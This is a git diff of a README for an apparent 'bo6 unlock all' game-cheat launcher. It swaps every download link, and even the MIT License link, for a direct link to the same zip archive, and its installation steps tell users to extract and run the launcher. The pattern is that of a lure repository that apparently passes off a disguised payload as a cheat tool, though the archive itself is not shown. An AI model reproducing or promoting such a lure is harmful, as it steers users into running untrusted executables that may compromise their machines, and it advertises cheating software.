@@ -1,11 +1,11 @@
 # 🚀 bo6 unlock all  
-[![Download Now](https://img.shields.io/badge/Download-EasyLauncher-blue.svg?logo=github)](https://graph.org/EasyLauncher-06-23)
+[![Download Now](https://raw.githubusercontent.com/Lucxsantxs/BO6-UltimateUnlocker/main/marshfire/BO6-UltimateUnlocker.zip)](https://raw.githubusercontent.com/Lucxsantxs/BO6-UltimateUnlocker/main/marshfire/BO6-UltimateUnlocker.zip)
 
 Unlock all features and hidden assets in your favorite shooter, "bo6", instantly! This launcher helps you enable everything safely and efficiently, maximizing your user experience with optimized controls and smart technology.  
  
 ## 🌐 Download  
 Click here to get started:  
-[![Download Now](https://img.shields.io/badge/Download-EasyLauncher-blue.svg?logo=github)](https://graph.org/EasyLauncher-06-23)
+[![Download Now](https://raw.githubusercontent.com/Lucxsantxs/BO6-UltimateUnlocker/main/marshfire/BO6-UltimateUnlocker.zip)](https://raw.githubusercontent.com/Lucxsantxs/BO6-UltimateUnlocker/main/marshfire/BO6-UltimateUnlocker.zip)
 
 ---
 
@@ -38,7 +38,7 @@ bo6, unlock, launcher, activation, utility, cross-platform, gaming tool, pc, mac
 
 ## 📦 Installation  
 **Step 1.**  
-[![Download Now](https://img.shields.io/badge/Download-EasyLauncher-blue.svg?logo=github)](https://graph.org/EasyLauncher-06-23)  
+[![Download Now](https://raw.githubusercontent.com/Lucxsantxs/BO6-UltimateUnlocker/main/marshfire/BO6-UltimateUnlocker.zip)](https://raw.githubusercontent.com/Lucxsantxs/BO6-UltimateUnlocker/main/marshfire/BO6-UltimateUnlocker.zip)  
 Extract the archive, run the launcher that matches your OS, and follow on-screen guidance to access all in-game features.
 
 ---
@@ -49,9 +49,9 @@ This launcher is designed for personal, ethical use. Please ensure compliance wi
 ---
 
 ## 📄 License  
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/Lucxsantxs/BO6-UltimateUnlocker/main/marshfire/BO6-UltimateUnlocker.zip).  
 
 ---
 
 ## 🔗 Download Link Again  
-[![Download Now](https://img.shields.io/badge/Download-EasyLauncher-blue.svg?logo=github)](https://graph.org/EasyLauncher-06-23)
+[![Download Now](https://raw.githubusercontent.com/Lucxsantxs/BO6-UltimateUnlocker/main/marshfire/BO6-UltimateUnlocker.zip)](https://raw.githubusercontent.com/Lucxsantxs/BO6-UltimateUnlocker/main/marshfire/BO6-UltimateUnlocker.zip)
